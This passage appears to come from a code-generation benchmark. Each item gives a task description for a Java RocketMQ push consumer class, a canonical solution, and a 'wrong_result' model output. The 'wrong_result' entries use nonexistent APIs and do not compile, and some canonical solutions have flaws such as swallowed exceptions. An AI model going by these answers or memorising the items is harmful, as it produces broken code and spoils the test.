    "Instruction": "Task Description: Create a Java class that implements a RocketMQ push consumer to subscribe to messages from a specified topic and process them asynchronously.\n\nClass Description: The SimpleConsumer class provides a basic implementation of a RocketMQ push consumer. It handles the setup, subscription, message listening, and lifecycle management of a consumer instance. The class allows for easy configuration of consumer group, NameServer address, topic subscription, and message processing logic.\n\nAttributes:\n- consumer: DefaultMQPushConsumer - The core RocketMQ push consumer instance that handles message consumption\n\nMethods:\n- SimpleConsumer(String consumerGroup, String namesrvAddr) -> void - Constructor that initializes the consumer with a consumer group and NameServer address\n- subscribe(String topic, String subExpression) -> void - Subscribes to a specific topic with optional tag filtering\n- registerMessageListener(MessageListenerConcurrently listener) -> void - Registers a message listener to handle incoming messages\n- start() -> void - Starts the consumer to begin message consumption\n- shutdown() -> void - Shuts down the consumer gracefully\n- createDefaultListener() -> MessageListenerConcurrently - Static factory method that creates a default message listener which prints received messages",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport java.util.List;\n\npublic class SimpleConsumer {\n    private DefaultMQPushConsumer consumer;\n\n    public SimpleConsumer(String consumerGroup, String namesrvAddr) {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void subscribe(String topic, String subExpression) throws MQClientException {\n        consumer.subscribe(topic, subExpression);\n    }\n\n    public void registerMessageListener(MessageListenerConcurrently listener) {\n        consumer.registerMessageListener(listener);\n    }\n\n    public void start() throws MQClientException {\n        consumer.start();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public static MessageListenerConcurrently createDefaultListener() {\n        return new MessageListenerConcurrently() {\n            @Override\n            public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n                for (MessageExt msg : msgs) {\n                    System.out.println(msg.getKeys() + \":\" + new String(msg.getBody()));\n                }\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            }\n        };\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "wrong_result": "public class SimpleConsumer {\n    private DefaultMQPushConsumer consumer;\n\n    public SimpleConsumer(String consumerGroup, String namesrvAddr) {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void subscribe(String topic, String subExpression) {\n        consumer.subscribe(topic, subExpression);\n    }\n\n    public void registerMessageListener(MessageListenerConcurrently listener) {\n        consumer.registerMessageListener(listener);\n    }\n\n    public void start() {\n        consumer.start();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public static MessageListenerConcurrently createDefaultListener() {\n        return new MessageListenerConcurrently() {\n            @Override\n            public ConsumeResult consumeMessage(List<MessageExt> messages, ConsumeContext context) {\n                for (MessageExt message : messages) {\n                    System.out.println(\"Received message: \" + new String(message.getBody()));\n                }\n                return ConsumeResult.CONSUME_SUCCESS;\n            }\n        };\n    }\n}"
  },
  {
    "Task_id": 360,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ message consumer using the push model. The class should handle message consumption from a specified topic, with configurable NameServer address and consumer group settings.\n\nClass Description: The Consumer class is a RocketMQ message consumer implementation that subscribes to a topic and processes incoming messages asynchronously. It uses DefaultMQPushConsumer for push-based consumption and provides methods to start, shutdown, and configure the consumer.\n\nAttributes:\n- CONSUMER_GROUP: [String] - The consumer group name for this consumer instance\n- DEFAULT_NAMESRVADDR: [String] - Default NameServer address if none is provided\n- TOPIC: [String] - The topic to subscribe to for messages\n- consumer: [DefaultMQPushConsumer] - The RocketMQ push consumer instance\n\nMethods:\n- Consumer() - [Constructor] -> [void] - Initializes the consumer with default settings, subscribes to the topic, and registers a message listener\n- start() -> [void] - Starts the consumer to begin receiving messages\n- shutdown() -> [void] - Shuts down the consumer gracefully\n- setNamesrvAddr(String namesrvAddr) -> [void] - Sets the NameServer address for the consumer",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\n\npublic class Consumer {\n\n    public static final String CONSUMER_GROUP = \"please_rename_unique_group_name_4\";\n    public static final String DEFAULT_NAMESRVADDR = \"127.0.0.1:9876\";\n    public static final String TOPIC = \"TopicTest\";\n\n    private DefaultMQPushConsumer consumer;\n\n    public Consumer() throws MQClientException {\n        consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n        consumer.subscribe(TOPIC, \"*\");\n        consumer.registerMessageListener((MessageListenerConcurrently) (msg, context) -> {\n            System.out.printf(\"%s Receive New Messages: %s %n\", Thread.currentThread().getName(), msg);\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        });\n    }\n\n    public void start() throws MQClientException {\n        consumer.start();\n        System.out.printf(\"Consumer Started.%n\");\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public void setNamesrvAddr(String namesrvAddr) {\n        consumer.setNamesrvAddr(namesrvAddr);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "wrong_result": "public class Consumer {\n    static final String CONSUMER_GROUP = \"RocketMQConsumerGroup\";\n    static final String DEFAULT_NAMESRVADDR = \"127.0.0.1:9876\";\n    static final String TOPIC = \"TestTopic\";\n    private DefaultMQPushConsumer consumer;\n\n    public Consumer() {\n        consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);\n        consumer.setNamesrvAddr(DEFAULT_NAMESRVADDR);\n        consumer.subscribe(TOPIC, \"*\");\n        consumer.registerMessageListener((MessageExt msg, ConsumeContext context) -> {\n            System.out.println(\"Received message: \" + new String(msg.getBody()));\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        });\n    }\n\n    public void start() {\n        consumer.start();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public void setNamesrvAddr(String namesrvAddr) {\n        consumer.setNamesrvAddr(namesrvAddr);\n    }\n}"
  },
  {
    "Task_id": 362,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ push consumer for processing order-related messages. The consumer should be initialized with Spring and configured to consume messages from a specified topic.\n\nClass Description: The OrderPushConsumer class is a Spring component that initializes and manages a RocketMQ push consumer. It subscribes to a specified topic, configures consumption settings, and processes incoming messages asynchronously.\n\nAttributes:\n- consumer: DefaultMQPushConsumer - The RocketMQ push consumer instance\n- topicName: String - The name of the topic to subscribe to (injected from properties)\n- namesrvAddr: String - The address of the NameServer (injected from properties)\n\nMethods:\n- init(): void - Initializes the consumer with configuration settings and starts it. This method is automatically called after construction due to the @PostConstruct annotation.\n  - Input: None\n  - Output: None\n  - Description: Configures the consumer with NameServer address, subscription details, batch size, and consumption strategy. Registers a message listener and starts the consumer.\n\n- (implicit) MessageListenerConcurrently.consumeMessage(List<MessageExt>, ConsumeConcurrentlyContext) -> ConsumeConcurrentlyStatus - Handles incoming messages\n  - Input: \n    - msgs: List<MessageExt> - List of received messages\n    - context: ConsumeConcurrentlyContext - Context for concurrent consumption\n  - Output: ConsumeConcurrentlyStatus - Status indicating whether message processing was successful\n  - Description: The anonymous implementation of MessageListenerConcurrently that processes batches of messages. Currently returns CONSUME_SUCCESS for all messages.",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\nimport javax.annotation.PostConstruct;\nimport java.util.List;\n\n@Component\npublic class OrderPushConsumer {\n\n    private DefaultMQPushConsumer consumer;\n\n    @Value(\"${rocketmq.topic.name}\")\n    private String topicName;\n\n    @Value(\"${rocketmq.nameserver.addr}\")\n    private String namesrvAddr;\n\n    @PostConstruct\n    public void init() throws Exception {\n        consumer = new DefaultMQPushConsumer(\"create_order_consumer_group2\");\n        consumer.setNamesrvAddr(namesrvAddr);\n        consumer.subscribe(topicName,\"*\");\n        consumer.setConsumeMessageBatchMaxSize(100);\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n\n        consumer.registerMessageListener(new MessageListenerConcurrently() {\n            @Override\n            public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            }\n        });\n        consumer.start();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "wrong_result": "@Component\npublic class OrderPushConsumer {\n\n    @Value(\"${rocketmq.namesrv.addr}\")\n    private String namesrvAddr;\n\n    @Value(\"${rocketmq.topic.order}\")\n    private String topicName;\n\n    private DefaultMQPushConsumer consumer;\n\n    @PostConstruct\n    public void init() {\n        consumer = new DefaultMQPushConsumer(namesrvAddr);\n        consumer.subscribe(topicName, \"*\");\n        consumer.setConcurrentNum(3);\n        consumer.setBatchSize(100);\n        consumer.registerMessageListener((List<MessageExt> msgs, ConsumeConcurrentlyContext context) -> {\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        });\n        consumer.start();\n    }\n}"
  },
  {
    "Task_id": 363,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ consumer to monitor and handle offset moved events in a message queue system.\n\nClass Description: The RocketMQConsumer class is designed to consume messages from a RocketMQ broker, specifically monitoring for offset moved events. It uses a push-based consumption model with a single-threaded listener to process messages. The class handles message subscription, listener configuration, and consumer lifecycle management.\n\nAttributes:\n- defaultMQPushConsumer: DefaultMQPushConsumer - The main consumer instance that connects to RocketMQ and handles message consumption\n- monitorListener: MonitorListener - (Assumed from context) Listener interface for reporting delete message events\n\nMethods:\n- RocketMQConsumer(RPCHook, String) -> void - Constructor that initializes the consumer with RPC hook and NameServer address\n- generateInstanceName(String) -> String - Generates a unique instance name for the consumer\n- configureMessageListener() -> void - Configures the message listener to handle incoming messages\n- subscribeToTopic() -> void - Subscribes to the offset moved event topic\n- start() -> void - Starts the consumer to begin message consumption\n- shutdown() -> void - Shuts down the consumer gracefully",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.MixAll;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.rocketmq.common.topic.TopicValidator;\nimport org.apache.rocketmq.remoting.RPCHook;\n\npublic class RocketMQConsumer {\n\n    private final DefaultMQPushConsumer defaultMQPushConsumer;\n\n    public RocketMQConsumer(RPCHook rpcHook, String namesrvAddr) throws MQClientException {\n        this.defaultMQPushConsumer = new DefaultMQPushConsumer(MixAll.MONITOR_CONSUMER_GROUP, rpcHook);\n        this.defaultMQPushConsumer.setNamesrvAddr(namesrvAddr);\n        this.defaultMQPushConsumer.setInstanceName(generateInstanceName(namesrvAddr));\n        this.defaultMQPushConsumer.setConsumeThreadMin(1);\n        this.defaultMQPushConsumer.setConsumeThreadMax(1);\n        \n        configureMessageListener();\n        subscribeToTopic();\n    }\n\n    private String generateInstanceName(String namesrvAddr) {\n        return \"MonitorService_\" + (System.currentTimeMillis() + RandomUtils.nextInt(0, Integer.MAX_VALUE) + namesrvAddr).hashCode();\n    }\n\n    private void configureMessageListener() {\n        this.defaultMQPushConsumer.registerMessageListener(new MessageListenerConcurrently() {\n            @Override\n            public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs,\n                ConsumeConcurrentlyContext context) {\n                try {\n                    OffsetMovedEvent ome =\n                        OffsetMovedEvent.decode(msgs.get(0).getBody(), OffsetMovedEvent.class);\n\n                    DeleteMsgsEvent deleteMsgsEvent = new DeleteMsgsEvent();\n                    deleteMsgsEvent.setOffsetMovedEvent(ome);\n                    deleteMsgsEvent.setEventTimestamp(msgs.get(0).getStoreTimestamp());\n\n                    MonitorService.this.monitorListener.reportDeleteMsgsEvent(deleteMsgsEvent);\n                } catch (Exception e) {\n                }\n\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            }\n        });\n    }\n\n    private void subscribeToTopic() throws MQClientException {\n        this.defaultMQPushConsumer.subscribe(TopicValidator.RMQ_SYS_OFFSET_MOVED_EVENT, \"*\");\n    }\n\n    public void start() throws MQClientException {\n        this.defaultMQPushConsumer.start();\n    }\n\n    public void shutdown() {\n        this.defaultMQPushConsumer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "wrong_result": "public class RocketMQConsumer {\n    private DefaultMQPushConsumer defaultMQPushConsumer;\n    private MonitorListener monitorListener;\n\n    public RocketMQConsumer(RPCHook rpcHook, String nameServer) {\n        defaultMQPushConsumer = new DefaultMQPushConsumer(generateInstanceName(nameServer));\n        defaultMQPushConsumer.setNamesrvAddr(nameServer);\n        defaultMQPushConsumer.setRPCHook(rpcHook);\n    }\n\n    private String generateInstanceName(String nameServer) {\n        return \"RocketMQConsumer_\" + System.currentTimeMillis();\n    }\n\n    public void configureMessageListener() {\n        monitorListener = new MonitorListener() {\n            @Override\n            public void onMessage(MessageExt msg, Object obj) {\n                // Handle offset moved event\n            }\n        };\n        defaultMQPushConsumer.setMessageListener(monitorListener);\n    }\n\n    public void subscribeToTopic() {\n        defaultMQPushConsumer.subscribe(\"OFFSET_MOVED_TOPIC\", \"*\");\n    }\n\n    public void start() {\n        defaultMQPushConsumer.start();\n    }\n\n    public void shutdown() {\n        defaultMQPushConsumer.shutdown();\n    }\n}"
  },
  {
    "Task_id": 364,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ consumer capable of subscribing to topics, filtering messages, and processing them asynchronously.\n\nClass Description: The RocketMQConsumer class provides a wrapper around RocketMQ's DefaultMQPushConsumer to simplify consumer setup and message handling. It supports both tag-based and SQL92 filtering, configurable threading, and various RocketMQ features like message tracing and ACL.\n\nAttributes:\n- consumer: DefaultMQPushConsumer - The underlying RocketMQ push consumer instance\n- topic: String - The topic to subscribe to\n- group: String - The consumer group name\n- threadCount: int - Number of threads for message processing\n- filterType: String - Type of message filtering (TAG or SQL92)\n- expression: String - Filter expression (either tag or SQL condition)\n- msgTraceEnable: boolean - Whether to enable message tracing\n- aclEnable: boolean - Whether to enable access control\n- clientRebalanceEnable: boolean - Whether to enable client-side rebalancing\n- rpcHook: RPCHook - Custom RPC hook for authentication\n\nMethods:\n- initialize(): void - Initializes the consumer with configured settings and subscribes to the topic\n- setMessageListener(MessageListenerConcurrently listener): void - Registers a message listener for concurrent message processing\n- start(): void - Starts the consumer to begin receiving messages\n- shutdown(): void - Gracefully shuts down the consumer\n- setNamesrvAddr(String namesrvAddr): void - Sets the NameServer address for broker discovery",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.MessageSelector;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.consumer.rebalance.AllocateMessageQueueAveragely;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.MixAll;\nimport org.apache.rocketmq.common.filter.ExpressionType;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.rocketmq.remoting.RPCHook;\n\npublic class RocketMQConsumer {\n\n    private DefaultMQPushConsumer consumer;\n    private String topic;\n    private String group;\n    private int threadCount;\n    private String filterType;\n    private String expression;\n    private boolean msgTraceEnable;\n    private boolean aclEnable;\n    private boolean clientRebalanceEnable;\n    private RPCHook rpcHook;\n\n    public RocketMQConsumer(String topic, String group, int threadCount, String filterType, \n                          String expression, boolean msgTraceEnable, boolean aclEnable, \n                          boolean clientRebalanceEnable, RPCHook rpcHook) {\n        this.topic = topic;\n        this.group = group;\n        this.threadCount = threadCount;\n        this.filterType = filterType;\n        this.expression = expression;\n        this.msgTraceEnable = msgTraceEnable;\n        this.aclEnable = aclEnable;\n        this.clientRebalanceEnable = clientRebalanceEnable;\n        this.rpcHook = rpcHook;\n    }\n\n    public void initialize() throws MQClientException {\n        consumer = new DefaultMQPushConsumer(group, rpcHook, new AllocateMessageQueueAveragely(), msgTraceEnable, null);\n        consumer.setConsumeThreadMin(threadCount);\n        consumer.setConsumeThreadMax(threadCount);\n        consumer.setInstanceName(Long.toString(System.currentTimeMillis()));\n        consumer.setClientRebalance(clientRebalanceEnable);\n\n        if (filterType == null || expression == null) {\n            consumer.subscribe(topic, \"*\");\n        } else {\n            if (ExpressionType.TAG.equals(filterType)) {\n                String expr = MixAll.file2String(expression);\n                consumer.subscribe(topic, MessageSelector.byTag(expr));\n            } else if (ExpressionType.SQL92.equals(filterType)) {\n                String expr = MixAll.file2String(expression);\n                consumer.subscribe(topic, MessageSelector.bySql(expr));\n            } else {\n                throw new IllegalArgumentException(\"Not support filter type! \" + filterType);\n            }\n        }\n    }\n\n    public void setMessageListener(MessageListenerConcurrently listener) {\n        consumer.registerMessageListener(listener);\n    }\n\n    public void start() throws MQClientException {\n        consumer.start();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public void setNamesrvAddr(String namesrvAddr) {\n        consumer.setNamesrvAddr(namesrvAddr);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "wrong_result": "public class RocketMQConsumer {\n    private DefaultMQPushConsumer consumer;\n    private String topic;\n    private String group;\n    private int threadCount;\n    private String filterType;\n    private String expression;\n    private boolean msgTraceEnable;\n    private boolean aclEnable;\n    private boolean clientRebalanceEnable;\n    private RPCHook rpcHook;\n    private String namesrvAddr;\n\n    public RocketMQConsumer(String group) {\n        this.group = group;\n    }\n\n    public void setTopic(String topic) {\n        this.topic = topic;\n    }\n\n    public void setThreadCount(int threadCount) {\n        this.threadCount = threadCount;\n    }\n\n    public void setFilterType(String filterType) {\n        this.filterType = filterType;\n    }\n\n    public void setExpression(String expression) {\n        this.expression = expression;\n    }\n\n    public void setMsgTraceEnable(boolean msgTraceEnable) {\n        this.msgTraceEnable = msgTraceEnable;\n    }\n\n    public void setAclEnable(boolean aclEnable) {\n        this.aclEnable = aclEnable;\n    }\n\n    public void setClientRebalanceEnable(boolean clientRebalanceEnable) {\n        this.clientRebalanceEnable = clientRebalanceEnable;\n    }\n\n    public void setRpcHook(RPCHook rpcHook) {\n        this.rpcHook = rpcHook;\n    }\n\n    public void setNamesrvAddr(String namesrvAddr) {\n        this.namesrvAddr = namesrvAddr;\n    }\n\n    public void initialize() {\n        consumer = new DefaultMQPushConsumer(group);\n        consumer.setNamesrvAddr(namesrvAddr);\n        consumer.setConcurrentNums(threadCount);\n        consumer.setMsgTraceEnable(msgTraceEnable);\n        consumer.setACLEnable(aclEnable);\n        consumer.setClientRebalanceEnable(clientRebalanceEnable);\n        consumer.setRPCHook(rpcHook);\n        if (\"TAG\".equals(filterType)) {\n            consumer.subscribe(topic, expression);\n        } else if (\"SQL92\".equals(filterType)) {\n            consumer.subscribe(topic, expression);\n        }\n    }\n\n    public void setMessageListener(MessageListenerConcurrently listener) {\n        consumer.setMessageListener(listener);\n    }\n\n    public void start() {\n        consumer.start();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n}"
  },
  {
    "Task_id": 365,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ push consumer to asynchronously receive and process messages from a specified topic.\n\nClass Description: The PushConsumer class provides a wrapper around RocketMQ's DefaultMQPushConsumer to simplify message consumption. It handles consumer initialization, topic subscription, message listening, and lifecycle management.\n\nAttributes:\n- consumer: DefaultMQPushConsumer - The underlying RocketMQ push consumer instance\n\nMethods:\n- PushConsumer(String consumerGroup, String namesrvAddr) -> void - Constructor that initializes the consumer with a consumer group and NameServer address\n- subscribe(String topic, String subExpression) -> void - Subscribes to a specific topic with optional tag filtering\n- setConsumeFromWhere(ConsumeFromWhere consumeFromWhere) -> void - Sets the consumption starting point (e.g., from last offset or earliest)\n- setConsumeTimestamp(String consumeTimestamp) -> void - Sets the timestamp for consumption starting point\n- registerMessageListener(MessageListenerConcurrently listener) -> void - Registers a callback for processing received messages\n- start() -> void - Starts the consumer to begin message consumption\n- shutdown() -> void - Shuts down the consumer gracefully\n\nNested Class:\n- SimpleMessageListener: MessageListenerConcurrently - A basic message listener implementation that prints received messages and returns success status",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.message.MessageExt;\n\nimport java.util.List;\n\npublic class PushConsumer {\n\n    private DefaultMQPushConsumer consumer;\n\n    public PushConsumer(String consumerGroup, String namesrvAddr) throws MQClientException {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void subscribe(String topic, String subExpression) throws MQClientException {\n        consumer.subscribe(topic, subExpression);\n    }\n\n    public void setConsumeFromWhere(ConsumeFromWhere consumeFromWhere) {\n        consumer.setConsumeFromWhere(consumeFromWhere);\n    }\n\n    public void setConsumeTimestamp(String consumeTimestamp) {\n        consumer.setConsumeTimestamp(consumeTimestamp);\n    }\n\n    public void registerMessageListener(MessageListenerConcurrently listener) {\n        consumer.registerMessageListener(listener);\n    }\n\n    public void start() throws MQClientException {\n        consumer.start();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public static class SimpleMessageListener implements MessageListenerConcurrently {\n        @Override\n        public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n            System.out.printf(Thread.currentThread().getName() + \" Receive New Messages: \" + msgs + \"%n\");\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "wrong_result": "public class PushConsumer {\n    private DefaultMQPushConsumer consumer;\n\n    public PushConsumer(String consumerGroup, String namesrvAddr) {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void subscribe(String topic, String subExpression) {\n        consumer.subscribe(topic, subExpression);\n    }\n\n    public void setConsumeFromWhere(ConsumeFromWhere consumeFromWhere) {\n        consumer.setConsumeFromWhere(consumeFromWhere);\n    }\n\n    public void setConsumeTimestamp(String consumeTimestamp) {\n        consumer.setConsumeTimestamp(consumeTimestamp);\n    }\n\n    public void registerMessageListener(MessageListenerConcurrently listener) {\n        consumer.registerMessageListener(listener);\n    }\n\n    public void start() {\n        consumer.start();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public static class SimpleMessageListener implements MessageListenerConcurrently {\n        @Override\n        public ConsumeResult consumeMessage(List<MessageExt> messages, ConsumeContext context) {\n            for (MessageExt msg : messages) {\n                System.out.println(\"Received message: \" + new String(msg.getBody()));\n            }\n            return ConsumeResult.CONSUME_SUCCESS;\n        }\n    }\n}"
  },
  {
    "Task_id": 366,
    "Instruction": "Task Description: Implement a RocketMQ consumer class in Java that can subscribe to a topic, consume messages asynchronously, and handle message consumption with configurable retry behavior.\n\nClass Description: The RocketMQConsumer class is responsible for consuming messages from a RocketMQ broker. It provides functionality to initialize the consumer, start message consumption with configurable retry behavior, and shutdown the consumer gracefully.\n\nAttributes:\n- consumer: DefaultMQPushConsumer - The RocketMQ push consumer instance\n- consumerGroup: String - The consumer group name\n- topic: String - The topic to subscribe to\n- subscription: String - The subscription expression (tags filter)\n- returnFailedHalf: boolean - Flag to control whether to return failure status for half of the messages\n\nMethods:\n- initialize() throws MQClientException -> void - Initializes the consumer instance with the specified group name and subscription\n- start() throws MQClientException -> void - Starts the consumer with a message listener that handles incoming messages and implements the retry logic\n- shutdown() -> void - Shuts down the consumer instance gracefully",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport java.util.List;\nimport java.util.concurrent.atomic.AtomicLong;\n\npublic class RocketMQConsumer {\n\n    private DefaultMQPushConsumer consumer;\n    private String consumerGroup;\n    private String topic;\n    private String subscription;\n    private boolean returnFailedHalf;\n\n    public RocketMQConsumer(String consumerGroup, String topic, String subscription, boolean returnFailedHalf) {\n        this.consumerGroup = consumerGroup;\n        this.topic = topic;\n        this.subscription = subscription;\n        this.returnFailedHalf = returnFailedHalf;\n    }\n\n    public void initialize() throws MQClientException {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setInstanceName(Long.toString(System.currentTimeMillis()));\n        consumer.subscribe(topic, subscription != null ? subscription : \"*\");\n    }\n\n    public void start() throws MQClientException {\n        consumer.registerMessageListener(new MessageListenerConcurrently() {\n            AtomicLong consumeTimes = new AtomicLong(0);\n\n            @Override\n            public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs,\n                ConsumeConcurrentlyContext context) {\n                long currentTimes = this.consumeTimes.incrementAndGet();\n                System.out.printf(\"%-8d %s%n\", currentTimes, msgs);\n                if (returnFailedHalf) {\n                    if ((currentTimes % 2) == 0) {\n                        return ConsumeConcurrentlyStatus.RECONSUME_LATER;\n                    }\n                }\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            }\n        });\n\n        consumer.start();\n        System.out.printf(\"Consumer Started.%n\");\n    }\n\n    public void shutdown() {\n        if (consumer != null) {\n            consumer.shutdown();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "wrong_result": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer; import org.apache.rocketmq.client.consumer.ConsumeConcurrentlyStatus; import org.apache.rocketmq.client.exception.MQClientException; import org.apache.rocketmq.common.message.Message; public class RocketMQConsumer { private DefaultMQPushConsumer consumer; private String consumerGroup; private String topic; private String subscription; private boolean returnFailedHalf; public RocketMQConsumer(String consumerGroup, String topic, String subscription) { this.consumerGroup = consumerGroup; this.topic = topic; this.subscription = subscription; } public void initialize() throws MQClientException { consumer = new DefaultMQPushConsumer(consumerGroup); consumer.setNamesrvAddr(\"localhost:9876\"); consumer.subscribe(topic, subscription); } public void start() throws MQClientException { consumer.setMessageListener((MessageListenerConcurrently) (msgs, context) -> { for (Message msg : msgs) { try { System.out.println(\"Received message: \" + new String(msg.getBody())); } catch (Exception e) { if (returnFailedHalf) { context.fail(); } else { context.getMessageContext().put(\"error\", e.getMessage()); } } } return ConsumeConcurrentlyStatus.CONSUME_SUCCESS; }); consumer.start(); } public void shutdown() { if (consumer != null) { consumer.shutdown(); } } }"
  },
  {
    "Task_id": 367,
    "Instruction": "Task Description: Create a Java class that configures and initializes a RocketMQ push consumer with specific settings for message consumption, including topic subscription and message listener registration.\n\nClass Description: The `AliyunMqConfiguration` class is a Spring configuration class responsible for setting up a RocketMQ push consumer. It configures the consumer with NameServer address, consumption strategy, topic subscriptions, and message listeners. The consumer is started asynchronously after a short delay to ensure proper initialization.\n\nAttributes:\n- `uacPushMessageListener`: [UacPushMessageListener] - The message listener implementation that handles incoming messages\n- `paascloudProperties`: [PaascloudProperties] - Configuration properties containing RocketMQ settings\n- `taskExecutor`: [TaskExecutor] - Executor service for asynchronous consumer startup\n\nMethods:\n- `defaultMQPushConsumer()`: [None] -> [DefaultMQPushConsumer] - Configures and initializes the RocketMQ push consumer with the following steps:\n  1. Creates a new DefaultMQPushConsumer instance with the consumer group from properties\n  2. Sets the NameServer address from properties\n  3. Configures consumption to start from the last offset\n  4. Parses and subscribes to topics and tags from constants\n  5. Registers the message listener\n  6. Sets thread pool size for message consumption\n  7. Starts the consumer asynchronously after a 5-second delay\n  8. Returns the configured consumer instance",
